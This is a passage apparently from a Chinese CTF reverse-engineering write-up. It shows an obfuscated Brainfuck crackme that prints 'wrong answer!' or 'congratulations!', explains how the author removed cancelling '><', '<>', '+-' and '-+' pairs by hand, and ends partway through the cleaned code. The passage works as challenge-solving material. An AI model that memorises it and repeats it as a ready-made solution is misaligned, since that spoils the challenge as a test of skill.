&quot;+-&lt;&gt;&lt;-&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;-+&lt;&gt;--+&gt;&lt;-&gt;&lt;+-+-&lt;&gt;+-&gt;-+-+-&lt;&gt;-+][]&lt;--+-&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;+-+-+--&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;+-&gt;&lt;--&lt;&gt;-+&quot; &quot;&lt;&gt;&gt;&lt;+--&gt;&lt;&gt;&lt;+---+&lt;&gt;+--+-+[-++--++-+-&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-+&gt;&lt;&gt;&lt;-+[&gt;&lt;--++-+-]+-&gt;&lt;-++-][&lt;+[&lt;..]]&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;,&lt;&gt;&gt;&gt;&quot; &quot;&lt;&gt;&lt;&gt;&lt;+++-&gt;&lt;&gt;&lt;-+++-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;+-+++&lt;&gt;+-&gt;&lt;[&gt;&lt;+--+&gt;&lt;&gt;&lt;&lt;-+-++-&gt;&lt;-&gt;&lt;+-&lt;&gt;+-&gt;&lt;--+-++-&gt;&lt;-&gt;&lt;&lt;&gt;--++---+-+-&lt;&gt;&gt;&lt;&quot; &quot;&gt;&lt;-+-+-&gt;&lt;-&lt;&gt;-+-&lt;&gt;+--&lt;&gt;-&lt;&gt;--&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;--+&lt;&gt;-+&gt;&lt;&gt;-][&gt;&gt;[[[&gt;-[++-[,.--,+-]--[&gt;[.-&gt;&gt;],.,[.-&gt;]]&lt;.&lt;],-[,+&lt;&lt;&quot; &quot;&gt;&gt;],.]+,&gt;[&gt;-[+&lt;&lt;]&gt;]]--,]---]&gt;&lt;&lt;&gt;&lt;-+---++--++--+-&gt;&lt;-+[+-&lt;-+&gt;&lt;+-+&lt;&gt;&gt;&lt;-+&gt;&lt;&gt;&lt;&gt;&gt;&lt;[+-&gt;&lt;-+-+-+-][.-&lt;-[&lt;[,&gt;[&quot; &quot;]--.++&lt;].-.&gt;+]]]&lt;&gt;,&gt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;+&gt;&lt;-++&gt;&lt;&gt;&lt;+&lt;&gt;&gt;&lt;+-&lt;&gt;+&lt;&gt;-+-++&gt;&lt;&lt;&gt;+-&gt;&lt;++-&lt;&gt;+-++--+++-++-&gt;&lt;[&lt;&gt;&lt;--+&lt;&gt;+--&lt;&gt;&gt;&lt;&lt;&quot; &quot;&gt;&lt;&gt;-+--&gt;&lt;&lt;&gt;&lt;&gt;-+--&gt;&lt;&lt;&gt;-+--+&gt;&lt;-+-+--++--&gt;&lt;&lt;&gt;-&lt;&gt;+-&lt;&gt;--+&lt;&gt;&gt;-+-+--+&gt;&lt;]&lt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;[&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;-++&gt;&lt;&gt;&gt;&lt;&lt;&gt;+-&lt;&quot; &quot;&gt;[+-&gt;&lt;+--]+--++-&lt;&gt;]+-&lt;&gt;&gt;&lt;-+,-+&lt;&gt;+-&gt;&lt;&lt;&gt;&gt;+-+-+&gt;&lt;+&lt;&gt;&gt;&lt;-+-+++-+-&lt;&gt;-+-+++-+++--++-&lt;&gt;&gt;&lt;+-+[+-&lt;+-+--+-&gt;&lt;-&gt;&lt;&quot; &quot;&gt;&lt;&gt;&lt;--+-+--&lt;&gt;-+---+&gt;&lt;&gt;&lt;-+-+--&gt;&lt;-&gt;&lt;-+-+&gt;&lt;--+&gt;&lt;-+--&gt;&lt;&lt;&gt;--+-++--+&lt;&gt;&gt;&lt;&gt;+--+-&lt;&gt;]+-&lt;&gt;&lt;&gt;-+&lt;-+-+-&gt;&lt;&lt;&gt;+-&lt;&gt;-+[&quot; &quot;&lt;&gt;-+-+&gt;&lt;&lt;-++-&lt;&gt;+-+-++-+-&gt;&lt;&gt;-+&lt;&gt;&gt;&lt;[&lt;&gt;-+-&gt;&lt;+-][[+&gt;.[,-+]&lt;[&lt;[&gt;,+.-,][&lt;+&gt;[-,,,[&lt;,+[&lt;&lt;+[+.-,[,+]&gt;.+]-+-[&lt;&quot; &quot;.&lt;[&gt;.[...-],]+&gt;[+--[&gt;---,]&gt;-&lt;[-,&lt;&gt;]...].]+&lt;][&lt;&lt;[&gt;&lt;+&lt;-[+&lt;[&gt;-.+&lt;&gt;&gt;]+,]+&gt;,]]]&lt;,]+-,]&lt;+].--]&lt;]+-+-+--+]&gt;&quot; &quot;&lt;+--+&lt;&gt;&gt;&lt;,+-+-&gt;&lt;-+-+&gt;+&gt;&lt;-+-++-&lt;&gt;++&lt;&gt;&gt;&lt;+&lt;&gt;-+-++&lt;&gt;+&lt;&gt;[-+-+&lt;-+-++-&gt;&lt;--+&lt;&gt;-&gt;&lt;&lt;&gt;+--&lt;&gt;-&gt;&lt;--+--+-+-+&lt;&gt;&lt;&gt;-+-&quot; &quot;&lt;&gt;+-&gt;&lt;+--+-&gt;&lt;-&lt;&gt;-+-+&gt;&lt;-+&gt;-&gt;&lt;-+-++--+]-+-+-+&lt;+--++-&gt;&lt;+--&gt;&lt;&lt;&gt;-+&gt;&lt;[&lt;+-+--+&gt;&lt;+&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;+--+&gt;&lt;-++-[&lt;&gt;&lt;&gt;-+&quot; &quot;--+&lt;&gt;-+][+&gt;[-.&lt;[[+[+-&gt;,+.,&gt;]&gt;+-]&gt;[+[++,&gt;[,,[+[.&lt;&gt;&gt;.[&gt;,]+]&lt;&lt;]-.&gt;+-]&gt;-].-&gt;++],]&gt;[&gt;[.[-&gt;&lt;+&gt;.+],].,[&lt;[-&lt;&quot; &quot;,[[[&gt;&lt;-,&gt;]-]+[,,-[.&lt;[+&lt;[&lt;,-,-]+,+][[.,-&gt;]+[--,&lt;+]&gt;]&lt;]+.--],.&gt;]].[--[&gt;.&lt;[-+[,&gt;...,]-,]&lt;&lt;[[+-&lt;&lt;&gt;]&gt;.]&lt;]&quot; &quot;.+&gt;]-]-.]+],&lt;&gt;]&gt;&lt;+-&lt;&gt;&lt;&gt;][&gt;,[,-[[..[..,&lt;[.--]-,&gt;]+&lt;[[,.[+&gt;&lt;[[&lt;+-+&gt;[+]&lt;&lt;]---[..[,+-&lt;].&gt;&lt;],&lt;]]]+-.&gt;]&gt;]-&quot; &quot;&gt;+],,&gt;[-,.&gt;].]&gt;-&gt;],+--+-+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;-+-++-++-+&gt;&lt;+-&gt;&lt;&gt;&lt;+&gt;&lt;+--+-+&lt;&gt;+&lt;&gt;[&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;+--+-+-&gt;&lt;&gt;&lt;+-&quot; &quot;---++--+-&gt;&lt;&lt;&gt;-+&gt;&lt;&gt;&lt;-+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;-+-+-&gt;&lt;-&gt;&lt;-+-&gt;&lt;+-&gt;&lt;-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+-&lt;&gt;-&lt;&gt;+-]-+&lt;&gt;+-&gt;&lt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;&lt;&gt;-+-+-[-+-+&gt;&lt;+&quot; &quot;-&lt;+-+-+-+-+-+&gt;[+--+&gt;&lt;&gt;&lt;-]][[[,[,,-,,.][.+--&gt;+&lt;],]++&gt;&gt;&lt;,]-]&gt;&lt;-+&lt;&gt;-+&gt;&lt;,&gt;+&gt;&lt;&gt;&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;++&lt;&gt;++-&lt;&gt;&lt;&gt;+-[&quot; &quot;-+-+&gt;&lt;&lt;-+-&lt;&gt;&lt;&gt;+--+-+--+-+&gt;&lt;&lt;&gt;&gt;&lt;--+&lt;&gt;+-+--+-+---+-+&gt;&lt;&gt;&lt;-+-&gt;&lt;-+&gt;&lt;-+-+-+--+-+--+&lt;&gt;-+---&lt;&gt;&lt;&gt;--+&gt;&lt;&lt;&gt;+-&gt;&lt;-&quot; &quot;---+&gt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;+-&lt;&gt;--&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;--++-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+--]&lt;&gt;&lt;&gt;&lt;-++--+--&gt;&lt;&lt;&gt;&gt;&lt;[&lt;+&lt;&gt;&gt;[&gt;&lt;+-+--][-&gt;[-]&lt;[&gt;&gt;-&lt;..].+]&quot; &quot;&lt;&gt;-+-+&gt;&lt;-+][[&gt;+-]+.+,]+-+-,&gt;&lt;&gt;++&lt;&gt;+-&lt;&gt;+&gt;&lt;+--++-++-++++-&lt;&gt;-+&lt;&gt;+-+&gt;&lt;-++-+-[-+&lt;-&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;--+&lt;&gt;-+&gt;&lt;-&gt;&lt;&quot; &quot;-+-++--+---++-&gt;&lt;-+-+----+&lt;&gt;+--&gt;&lt;-+-+-+-&lt;&gt;&lt;&gt;-+-&lt;&gt;-+&gt;&lt;-+&gt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;]-++-&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;-&lt;&gt;+--+&lt;&gt;-&gt;&lt;-&gt;&quot; &quot;&lt;&lt;&gt;[&lt;&gt;-++-&lt;+-&gt;&lt;&lt;&gt;+&gt;+-+-[-]-+&gt;&lt;&lt;&gt;]&lt;&gt;&lt;&gt;&lt;&gt;,-++-&lt;&gt;+-&gt;-+&gt;&lt;+-&lt;&gt;&gt;&lt;++&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&lt;+&gt;&lt;&gt;&lt;&lt;&gt;+-+&gt;&lt;-++-&lt;&gt;[+-&lt;-&lt;&gt;-&quot; &quot;+--&lt;&gt;-+-+&gt;&lt;&lt;&gt;-&lt;&gt;+---+--+--+&gt;&lt;+--+-+-&gt;&lt;&lt;&gt;-+--+&lt;&gt;--+&gt;&lt;&lt;&gt;&gt;&lt;-+--+&lt;&gt;-&gt;&lt;-+-&lt;&gt;-+-&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;+-&gt;&lt;--+&lt;&gt;+-+----+&quot; &quot;-+-+-&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-&gt;&lt;&gt;&lt;&gt;-++-&gt;&lt;-]-+&gt;&lt;+-&gt;&lt;&lt;&lt;&gt;--+--+&gt;&lt;-+[&lt;&gt;&lt;+-++-&lt;&gt;&gt;&gt;&lt;-++-&lt;&gt;[+-&lt;&gt;-&gt;&lt;+-&gt;&lt;&gt;&lt;][+[[[,--[[[+.&gt;&lt;&quot; &quot;]-&gt;]&lt;-&lt;.]&gt;&lt;[-[-&gt;&gt;&gt;[&lt;&lt;&gt;[+,&gt;[,+[++-]+.&gt;][-&gt;&lt;..],]&lt;&gt;[,,.[&lt;,-[+]&gt;+&gt;&lt;+]-,+]++]&lt;],].&gt;&lt;][+,&gt;,-[&lt;,.[&lt;&lt;[-[+-,&quot; &quot;&lt;-].[++.[[.--]&gt;-[&lt;&lt;]+],-]+--]&gt;,,[&gt;[-[,.&lt;].[[&lt;&lt;&lt;+,]&lt;-]+]-&gt;&lt;].&lt;].&gt;,]&gt;&lt;]&lt;]&lt;[[,&lt;[-&gt;].-]--]+]-[+.-]]+-&lt;&gt;&lt;&quot; &quot;&gt;&gt;&lt;-+]+-,+-&lt;&gt;+-&lt;&gt;&gt;+-++&lt;&gt;&lt;&gt;-++-+&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;+-++++&lt;&gt;+-&lt;&gt;&gt;&lt;+&lt;&gt;+-[&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;-+-&gt;&lt;+-&gt;&lt;-&gt;&lt;--&gt;&lt;+-&gt;&lt;&gt;&lt;--+&gt;&lt;&gt;-]&gt;&quot; &quot;&lt;&gt;&lt;&lt;+-+-+-+---++--+-+--+&gt;&lt;+---++-&gt;&lt;+-&gt;&lt;-&gt;&lt;-+&lt;&gt;&gt;&lt;-+-&lt;&gt;&gt;&lt;+--+-&lt;&gt;&lt;&gt;&gt;&lt;-++--[+-&lt;&gt;&lt;-+&gt;&lt;+-+&lt;&gt;&gt;&gt;&lt;+-&lt;&gt;[&gt;&lt;-&lt;&gt;&lt;&quot; &quot;&gt;-+-+]&lt;&gt;-+][.[,&lt;&lt;-&gt;.]&gt;-+],+-&lt;&gt;&gt;&lt;&gt;-+-+-+++-+&lt;&gt;&lt;&gt;&lt;&gt;-+++--++-++-&lt;&gt;&gt;&lt;&lt;&gt;++-+-+++--+&lt;&gt;-++[+--+&lt;-+-++---+&gt;&lt;&quot; &quot;-+-&lt;&gt;+-+-&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;-+-+--+&gt;&lt;&gt;&lt;-&lt;&gt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;+-+--&lt;&gt;+--+-&lt;&gt;-&gt;&lt;+-+--&lt;&gt;+-&gt;&lt;&gt;&lt;-+--+-+&lt;&gt;-&gt;-&gt;&lt;&lt;&gt;+--+][]+--+&quot; &quot;&gt;&lt;&lt;-&lt;&gt;-+-[&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+-+--++-+&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;-+&lt;&gt;[&gt;&lt;&lt;&gt;-][-[&gt;-,-[&lt;+&gt;,-,]&gt;-,]]][&gt;[-,[.&gt;+.][--++&lt;&gt;].]-[+-&lt;+]+&quot; &quot;..]&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;,&gt;&lt;+-&gt;&lt;-+&gt;&lt;&gt;+&lt;&gt;+++--+++&gt;&lt;-+-+&lt;&gt;+-+-+[+-+-+-&gt;&lt;&lt;+-&lt;&gt;+--&lt;&gt;&gt;&lt;-&gt;&lt;-+&gt;&lt;-+---+&lt;&gt;-+--&gt;&lt;--+&lt;&gt;-&gt;&lt;&gt;&lt;-&quot; &quot;&lt;&gt;+--+&gt;&lt;+--&gt;&lt;&gt;&lt;+-&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;-+-&gt;&lt;-&gt;&lt;-+--+&lt;&gt;&gt;&lt;&lt;&gt;--++--+&gt;&lt;--+-+&gt;&lt;-+-&lt;&gt;&gt;&lt;&lt;&gt;-+--+-&gt;&lt;-&gt;+-&gt;&lt;+--&gt;&lt;+--+&lt;&gt;]-+&gt;&lt;&quot; &quot;&lt;&gt;+-&lt;+-----+-&gt;&lt;-+-[&lt;+&gt;&lt;&lt;&gt;+-&gt;&gt;&lt;+-&lt;&gt;+--+[--+&lt;&gt;+-]]+&gt;&lt;-+&lt;-+[+-w&gt;&lt;-+&lt;&gt;r+-&gt;&lt;&lt;&gt;o&gt;&lt;-++-+-n-+-+g a-++-n&lt;&gt;s&gt;&lt;&quot; &quot;-+&lt;&gt;w-+&lt;&gt;&gt;&lt;+-e&gt;&lt;r-++-&gt;&lt;-+-+!&gt;&lt;-+-+&gt;&lt;&gt;-++-&lt;&gt;&gt;&lt;&lt;&gt;[+-&gt;&lt;&lt;&gt;--+][+[+[[.[&gt;[+,,[&gt;&lt;[[+&gt;+&lt;++]+&lt;&gt;,+],,&gt;&gt;&gt;]+],+.&quot; &quot;,+].],+,[-,-[.-+]--,&gt;,-].&lt;][-.[+&lt;[[&gt;-+[[.,+&lt;-[,..-&gt;],,+]--+[.--&lt;]][.[+&gt;,[&lt;+-[.+&gt;,&gt;.+,]&gt;&lt;,]&lt;&gt;]+[&gt;+-&lt;+&quot; &quot;+]&gt;]&gt;]&gt;+-]&lt;++[&gt;&gt;&gt;+&gt;-.]&gt;+-]&gt;]],&gt;.[&lt;,&lt;&gt;&lt;+-.]++&lt;]+--++-&lt;&gt;+-&lt;-+&gt;&lt;[+--+-+-&lt;&gt;-+]&lt;&gt;][--++&gt;...,]-+&gt;&lt;&gt;&lt;+-&gt;[&lt;&gt;&quot; &quot;&lt;&gt;&gt;&lt;-+c&lt;&gt;&lt;&gt;+-&gt;&lt;&gt;&lt;o&gt;&lt;-+&lt;&gt;-+n&gt;&lt;&lt;&gt;-++-g&lt;&gt;ra&gt;&lt;+-+-t+-&gt;&lt;-+&lt;&gt;&gt;&lt;ul&lt;&gt;at&lt;&gt;&gt;&lt;-++-io&lt;&gt;ns-+!-+&gt;&lt;-++-[&lt;&gt;+--+&lt;&gt;&gt;&lt;-&quot; &quot;&gt;&lt;&gt;&lt;-+][&lt;.+&gt;.+]][]&quot; );&#125; 看上去很复杂，并且我不会写脚本去混淆啥的，只能手动去混淆了。代码部分拖到sublime里，然后搜索&gt;&lt; &lt;&gt; +- -+，全部重复删个几遍。有很多输入应该是无效的，发现有效的输入会是类似,&gt;++++++++[&lt;-------&gt;-]这样的，然后排列了一下，得到： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&gt;,&gt;+++++[&lt;--------------------&gt;-]&lt;----[&lt;+&gt;[-][.&gt;&gt;[&lt;-,[[+[-&lt;.[-]-,+].[&lt;,[[&lt;,--[,&gt;[,&lt;+,.,]]+]&lt;.-].[&gt;[-.,.,[&lt;[&lt;-[&gt;.&lt;,.+&lt;]-..].,.[+[+][.,.&gt;,]]-]-.]+&gt;,]]&gt;]&gt;,.&gt;][&lt;,[&lt;[&lt;-&gt;[-.-.-]-]&lt;&lt;[.+[[&gt;,-[&lt;.&lt;[&gt;-&lt;.&lt;]+&lt;]&lt;,[&lt;..+],&gt;+]+,]&lt;--]-.]+..[.&lt;-[,&lt;[.[,&lt;[,,.]&lt;&lt;+].[--[-..&gt;[-&lt;..]&lt;-]+.]-]-&lt;,&lt;]-]-.&gt;],]-&lt;]][.-.[,[,+&gt;,&gt;][++[+[.[&gt;[&lt;,].]-[&gt;,],,]+,[.--[+,-,-]+,+]-&lt;&lt;].]]],&gt;+++++[&lt;--------------------&gt;-]&lt;---[&lt;+&gt;[-][.[&gt;&gt;+[&lt;&lt;,&lt;.&gt;[+&lt;.]+]&lt;[.&lt;.+[,[.,.+]..+]&gt;,-]-]&gt;--]],&gt;+++++[&lt;-------------------&gt;-]&lt;--[&lt;+&gt;[-][,&gt;&gt;]],&gt;+++++++[&lt;---------------&gt;-][-[.&gt;[,,&lt;[.,.[,[&gt;[.,+].-][&lt;.[&gt;[,&lt;[+]&gt;[-[.&lt;&lt;+.-]-[&gt;],]+][[+&gt;[&lt;,&lt;]]]++]++++]][+[&lt;[&gt;+.,-]-,+]&lt;]].+]-,++].-,]&lt;----[&lt;+&gt;[-]],&gt;+++++++++[&lt;-----------&gt;-][[&gt;[&gt;[+.[.[-[[,,++.[&lt;-[.+,&lt;]&lt;.&lt;]&gt;]]&gt;-,,].,]+&lt;]-,,&lt;][+.&gt;].],+]&lt;--[&lt;+&gt;[-]],&gt;++++++++[&lt;---------------&gt;-][..,,]&lt;---[&lt;+&gt;[-]][&gt;],&gt;++++++++[&lt;------------&gt;-][&gt;&gt;-]&lt;-----[&lt;+&gt;[-][[[--.[-.-&gt;[&lt;,.,[++&gt;]]&lt;]-.[.,[.]&gt;[&lt;[[&gt;&gt;-][&gt;-.[,+&lt;&lt;[[--,+,],&gt;[-&gt;-].,+]++&lt;]&lt;[-.[[+,+&lt;]&gt;[-&lt;.+]&gt;&gt;],[-,[&lt;]+&lt;]&lt;.]]-].]]],++]-&gt;[.-[,[-.&lt;&lt;.,].-[,-[,++]+,]]&gt;-&lt;]--&gt;]],&gt;+++++++++[&lt;-----&gt;-]&lt;------[&lt;+&gt;[-][[&lt;&lt;[,-.[&lt;+,&lt;]&gt;+],&lt;-,]+.++,.]],&gt;++++++[&lt;--------&gt;-]&lt;-----[&lt;+&gt;[-]],&gt;++++++[&lt;----------------&gt;-]&lt;-[&lt;+&gt;[-][,&lt;+,]],&gt;+++++++++[&lt;-----------&gt;-][-&gt;]&lt;--[&lt;+&gt;[-]],&gt;++++++[&lt;--------&gt;-]&lt;-[&lt;+&gt;[-][&lt;-.[&lt;[[.,[...],],.]&gt;,&lt;-.]]],&gt;+++++++[&lt;-------&gt;-]&lt;-[&lt;+&gt;[-]][&gt;,,-],&gt;+++++++[&lt;-------&gt;-][&gt;&gt;[-&gt;[,&lt;&lt;]],.[&lt;+.[,-.[,[+[-[&gt;,.[[&gt;.[.&lt;.,.]].-],]&gt;..&lt;&lt;]]&lt;.,]&lt;++&gt;].+&gt;]]&lt;[&lt;+&gt;[-][[.-[+[.&gt;&gt;[,-&gt;-]&gt;[[.-&lt;..&lt;[.,[.+[,[.&lt;,&gt;].,,[&lt;..]&gt;]..]&lt;.++].]]&lt;]+],&gt;]-..]],&gt;+++++[&lt;-----------&gt;-][[-.&gt;-&gt;+.][[+[+[+&lt;[..&gt;[&lt;.[&gt;&gt;++,]&gt;---]++[-&lt;.[+&lt;[,[-,,]&gt;[&lt;,&gt;]&lt;]]]][-[,[-,[+&gt;[&gt;,+&lt;].[..-]]+]&lt;.]&gt;]..]]+.+[-[+&lt;,[[..-[,+.[&gt;[&lt;]+[&gt;].]+&lt;],.[[.[,-.].[+,&gt;,]--][,[+&lt;.].&lt;[+].&lt;],&gt;],&lt;,],&gt;&gt;]+[...,],]+&gt;,&gt;]-]--&lt;]&lt;++]&lt;-[&lt;+&gt;[-][&gt;[,[&lt;[-[&gt;&gt;[,&gt;+[&lt;[&lt;&lt;&lt;&lt;&lt;.]-[&gt;-[&gt;-.[.-&lt;.&gt;]]..&lt;]]-]&gt;[&gt;-[,+[,,[+[.+]+][.,.[+&lt;-]-]+]-&lt;.]&gt;-.&gt;]][-]]][[.,[.-&lt;[[&gt;+&lt;+&gt;]-[[.---[-&lt;+.&gt;&gt;]][.[&gt;[.]+[-,,],]&gt;+]]]-].+,&lt;],&gt;-.],]-&lt;-[&lt;-[[[&gt;&gt;&gt;[,&gt;&gt;.[.&lt;+[&gt;&gt;,[.++&gt;]++]]&lt;],][+.&gt;]]+,[&gt;[,&gt;+&gt;+[,,-[-&gt;+[&gt;&gt;[+.&gt;[+,.]+].,]&lt;,]&lt;]-&gt;-]&lt;++]-&gt;.]-.-]-,]][&gt;.+],&gt;++++++[&lt;---------&gt;-]&lt;---[&lt;+&gt;[-]][&gt;,&lt;,&gt;.],&gt;++++++[&lt;----------------&gt;-]&lt;-[&lt;+&gt;[-]],&gt;+++++[&lt;---------&gt;-][&lt;+[,-&gt;[&gt;&gt;..&gt;[.---&gt;[.-,[[&gt;[,[&lt;+[&gt;,&lt;]&gt;-[.]][&lt;+&lt;,--]&lt;+].,&gt;][&lt;,+,.[+&gt;-[,.-[.&lt;,&gt;]]],]][.&gt;,,+&lt;,]&lt;].+&lt;]],-&gt;].]&lt;---[&lt;+&gt;[-][+&gt;-&lt;+]],&gt;++++++[&lt;----------------&gt;-][&lt;+[[,+[..&lt;].,-]--,[[&lt;,-[+&lt;+[&lt;[.&gt;,[.-&lt;[[-,&lt;.+],.,[.-&lt;,&gt;-]]&gt;&gt;-]],&gt;-&lt;][-[.,&lt;]&gt;.],&lt;]]&gt;-.[&gt;&gt;.[.[&lt;.+[[-&gt;&gt;[[,-]+&lt;]&gt;+[&gt;,-[,,]-&gt;,]]]-,],]]].]&lt;,.]&lt;--[&lt;+&gt;[-][.&gt;+[&gt;[.+,[[-&lt;.,&lt;[+,-.]]].,-]&gt;[--&gt;&gt;&gt;]].,+[&lt;-[,-,[&lt;.[.--[.+[[&lt;[+&gt;+[&lt;.--&gt;,-]++.+&lt;,][&lt;,[.,,&gt;]]]-]&lt;,[-&lt;-[[[,.]-[.&gt;&gt;,&lt;&lt;]-][&gt;&gt;&gt;+[..&gt;]-]-&lt;][[--&gt;[.,-]+][&lt;[&lt;.+.,]+&gt;.+++]..-]],,]&gt;,&gt;[++[-&lt;,-[..[+[&gt;&gt;&gt;+]-&lt;.[&lt;,-&gt;]&lt;-],,]]+,],-]&lt;]-&gt;,]&gt;&gt;].]][&lt;&lt;],&gt;++++++[&lt;--------&gt;-]&lt;[&lt;+&gt;[-][[&lt;,&gt;[-[+++[[[+.].+,[.&gt;+[-..[-[&lt;&lt;]]&lt;,[+[&lt;&lt;&lt;,--&lt;]&gt;,&gt;.]].]]&lt;[.&gt;+[&gt;[[&gt;.,[+&gt;.+&gt;.]&lt;+]+,]]+&lt;]..+].[[&lt;&lt;,.[--&gt;[-,[&gt;[.+&lt;]&gt;[+]&gt;.&lt;]&lt;&lt;,.][.+]&gt;,&lt;],-,],]].&lt;.].+]&lt;]][+&lt;&lt;[-&gt;[+&gt;[-&lt;.&lt;[+,+[[,+&gt;&gt;,&lt;-]]&lt;]-.].+],.+]&lt;.],&gt;+++++++++[&lt;------&gt;-][,&lt;[,&lt;[..[+&gt;,][,[,,[-.[.+[[.&lt;],..[,[+,,]]&gt;&gt;][&gt;,[,&gt;[+,.+]&lt;-.&gt;]&gt;[-,,[&lt;-]&lt;[&lt;+&gt;,.-,-]&lt;&lt;]-,]].&gt;&gt;&gt;]-&gt;++]++&lt;]+,,][+.-&gt;]-][..,]&gt;&gt;-]&lt;--[&lt;+&gt;[-]],&gt;++++++++++[&lt;-----&gt;-][.[[.++&gt;[&gt;.[++.&gt;][,&lt;[.[[&lt;[+&gt;&gt;+[.&lt;.-]&gt;][-].]-&lt;&lt;],&gt;.&gt;]+].]&gt;].&lt;+]+&gt;[.---&lt;+.]]&lt;-[&lt;+&gt;[-][,[&lt;.&lt;.-&lt;]+.&lt;[&lt;+[,--][&gt;,[--,&gt;.]&lt;]-.-]+.]],&gt;+++++++[&lt;-------&gt;-]&lt;[&lt;+&gt;[-][+&gt;-[&gt;[[+&gt;,.+].&lt;]]-[,-]&lt;,.]],&gt;++++++++++[&lt;---------&gt;-][[-&lt;-[+[&lt;.[.&gt;,.&gt;]&gt;,&lt;-]-&gt;-]&gt;+,]-[&lt;.&gt;.&lt;]]&lt;-------[&lt;+&gt;[-][+[-,&lt;+],-]],&gt;++++++[&lt;--------&gt;-][.-[-[-&gt;.&gt;+,][-]-,,]&lt;]&lt;---[&lt;+&gt;[-]],&gt;++++++[&lt;--------&gt;-][..&lt;-]&lt;--[&lt;+&gt;[-][&gt;[--][.&gt;-,--]-]],&gt;++++++++[&lt;-------&gt;-][.,-[,,,--[-&lt;].,&lt;]&lt;[,+.].]&lt;-[&lt;+&gt;[-][&lt;-&lt;[&gt;&gt;].]],&gt;++++++++[&lt;------------&gt;-][,[&gt;+[+,.&lt;--&lt;]&gt;[-[&lt;[-,[+.[[[.[,],[-&lt;,&gt;-]].-.]&lt;-[,+&gt;[.[+.+]],]&lt;,].,+[-&gt;,]--,],[&lt;&lt;.&lt;]&gt;.-],][+.,&gt;-],&gt;]]++]&lt;---[&lt;+&gt;[-][.[,[[.&lt;[[++]+.-],++,.]++].,,].[.[&lt;[&gt;,&gt;+]&lt;+]&lt;]]][[&lt;....[,&lt;.[.[[.[+&gt;++[&lt;.[&lt;.,--]&gt;],]&gt;+&gt;-&gt;][-&lt;[[+[[&gt;&gt;,.&lt;]&lt;]]+[+.[++,&gt;],.-]+.].&lt;],]-&lt;[+[&gt;&gt;]&gt;&gt;[+&gt;[++&gt;]&lt;+]..]&lt;.]&lt;[&lt;[.+[.-[-[,,&gt;+]]].--],++].]&lt;]&gt;-[+,+&gt;.],--],&gt;++++++++[&lt;------------&gt;-]&lt;------[&lt;+&gt;[-]],&gt;+++++++[&lt;--------&gt;-]&lt;[&lt;+&gt;[-][&gt;,[-&gt;[+&lt;[[,&lt;[-.&gt;]]]&gt;-]-[-,&gt;&gt;[[&gt;-[,[.,&lt;-&lt;]]+[&lt;,[&lt;+[-&lt;]]+]+],..[+[.+&lt;[+[-[&gt;-,.],.[.++]&lt;]&gt;,&lt;&lt;]-]&gt;--&lt;,]-]&gt;.]]]][&lt;[[.[-,,[.,&gt;[.,--]&gt;]+.&gt;],+[+&gt;]],&lt;+]&gt;],&gt;+++++++[&lt;-------&gt;-][,&gt;-,,+&lt;]&lt;-----[&lt;+&gt;[-][+,[-&gt;-,&gt;--..][,+[&lt;[&lt;+&lt;[,[[.,,,[,[&lt;[-&lt;+]&lt;].]][..--]+]+]],[&lt;-&gt;[&lt;&lt;.&gt;],,-&lt;+,]-&lt;-]&gt;+[[+.][+[&lt;[&lt;[--,&lt;,][,.-&gt;&gt;]]]&lt;,-]]+]+&gt;&gt;]],&gt;+++++++[&lt;--------------&gt;-]&lt;[&lt;+&gt;[-]][&gt;+],&gt;++++++++++[&lt;-----&gt;-]&lt;-[&lt;+&gt;[-][[[&lt;[&lt;[.[+.,.[-[&lt;[,-&lt;[&lt;&lt;.]&lt;+.&lt;]&lt;][&gt;+,,]&gt;&gt;,]][&lt;&lt;,&lt;+]-]-,&gt;[..,&gt;&gt;]].,]&gt;][&lt;&lt;&lt;[.&gt;+[[-&lt;[&gt;[.[[++&lt;[.&gt;,&lt;,]]-..[[-&gt;&gt;].,,.&gt;].+]+][,,&gt;,-&lt;-]&lt;..]&gt;]-,.&gt;+].&gt;&gt;]]+]],&gt;++++++++++[&lt;-----&gt;-][&gt;..&gt;,]&lt;-----[&lt;+&gt;[-][,--[-[-[.,-]&lt;--],]]][-[&gt;.[[++,,+&